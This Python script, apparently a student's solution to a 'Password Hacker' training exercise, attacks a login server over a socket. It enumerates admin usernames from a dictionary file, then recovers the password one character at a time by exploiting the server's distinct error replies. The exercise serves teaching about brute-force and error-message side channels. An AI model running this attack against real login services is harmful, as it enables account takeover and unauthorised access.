# write your code here
import argparse
import itertools
import json
import socket
import string


def test_credentials(sock, login, password):
    credentials = {"login": login, "password": password}
    sock.send(json.dumps(credentials).encode())
    response = sock.recv(1024)
    return json.loads(response.decode())


def read_dictionary(filename):
    with open(filename, 'r') as infile:
        for line in infile:
            yield line.rstrip('\n')


def main(args):
    with socket.socket() as testsock:
        address = (args.host, args.port)
        testsock.connect(address)

        adminlogin = ""
        testlogins = read_dictionary(args.admin)
        for testlogin in testlogins:
            reply = test_credentials(testsock, testlogin, " ")
            if reply['result'] == "Wrong password!":
                adminlogin = testlogin
                break

        adminpass = ""
        if adminlogin != "":
            characters = [c for c in string.ascii_letters] + [str(n) for n in range(10)]
            password = ""
            success = False
            while not success:
                for char in characters:
                    reply = test_credentials(testsock, adminlogin, password + char)
                    if reply['result'] == "Connection success!":
                        adminpass = password + char
                        success = True
                        break
                    elif reply['result'] == "Exception happened during login":
                        password += char
                        break

        creds = {"login": adminlogin, "password": adminpass}
        print(json.dumps(creds))


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('host', help="server hostname")
    parser.add_argument('port', help="server port number", type=int)
    parser.add_argument('-a', '--admin', help="dictionary of typical admin logins", default="/Users/professional/PycharmProjects/Password Hacker/Password Hacker/task/hacking/logins.txt")
    parser.add_argument('-p', '--paswd', help="dictionary of typical passwords", default="passwords.txt")
    main(parser.parse_args())
